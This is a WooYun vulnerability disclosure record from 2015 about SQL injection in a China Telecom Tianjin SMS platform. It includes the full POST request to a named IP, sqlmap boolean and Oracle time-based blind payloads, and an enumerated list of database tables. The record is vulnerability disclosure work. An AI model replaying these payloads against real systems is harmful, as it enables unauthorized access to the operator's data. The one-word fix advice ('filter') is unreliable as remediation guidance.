{"id": 30763, "wybug_id": "wooyun-2015-0115809", "wybug_title": "中国电信某市系统sql注入", "wybug_corp": "中国电信", "wybug_author": "路人甲", "wybug_date": "2015-06-02 11:57", "wybug_open_date": "2015-07-20 18:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 中国电信 详细说明：  中国电信   漏洞证明：  http://dxt.tjtele.com/http://123.150.223.13/index.jsp中国电信集团公司天津市电信分公司短信平台post数据：POST /index_user.jsp HTTP/1.0Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/QVOD, application/QVOD, */*Referer: http://123.150.223.13/index.jspAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 123.150.223.13Content-Length: 53Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=87T1K-f4EcdTs4zb2ucmd=1&operatorCode=13800138000&submit.x=8&submit.y=10注入数据：sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: operatorCode (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cmd=1&operatorCode=13800138000' AND 2140=2140 AND 'HyOo'='HyOo&submit.x=8&submit.y=10    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: cmd=1&operatorCode=13800138000' AND 7609=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(84)||CHR(89)||CHR(119),5) AND 'NCjr'='NCjr&submit.x=8&submit.y=10---[23:55:32] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[23:55:32] [INFO] fetching current database[23:55:32] [INFO] resumed: DXT[23:55:32] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'DXT'[23:55:32] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\123.150.223.13'[*] shutting down at 23:55:32\n\n跑表：Database: DXT[43 tables]+---------------------------+| BOMB_SUMNUM               || BUSINESS_ADINFO           || BUSINESS_AREA             || BUSINESS_BATCHSENDTASK    || BUSINESS_BLACKLIST        || BUSINESS_CALENDAR         || BUSINESS_CALENDAR_HISTORY || BUSINESS_CONFIG           || BUSINESS_DELACKPWD        || BUSINESS_FEATURE          || BUSINESS_FEATURETYPE      || BUSINESS_FILTERINFO       || BUSINESS_GROUP            || BUSINESS_GROUPMEMBER      || BUSINESS_MOREGCMD         || BUSINESS_OPRECORD         || BUSINESS_PRICEINFO        || BUSINESS_RIGHT            || BUSINESS_SENDCOUNT        || BUSINESS_SENDLOG          || BUSINESS_SENDSTAT         || BUSINESS_SMSCONTENT       || BUSINESS_SMSMSGSTAT       || BUSINESS_SMSTYPE          || BUSINESS_USER             || BUSINESS_USERLOG          || BUSINESS_USERROLE         || BUSINESS_USERROLERIGHT    || BUSINESS_USERSTATUS       || BUSINESS_WEBREGCODE       || PLAN_TABLE                || QRTZ_BLOB_TRIGGERS        || QRTZ_CALENDARS            || QRTZ_CRON_TRIGGERS        || QRTZ_FIRED_TRIGGERS       || QRTZ_JOB_DETAILS          || QRTZ_JOB_LISTENERS        || QRTZ_LOCKS                || QRTZ_PAUSED_TRIGGER_GRPS  || QRTZ_SCHEDULER_STATE      || QRTZ_SIMPLE_TRIGGERS      || QRTZ_TRIGGERS             || QRTZ_TRIGGER_LISTENERS    |+---------------------------+\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-06-05 18:52 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国xx集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}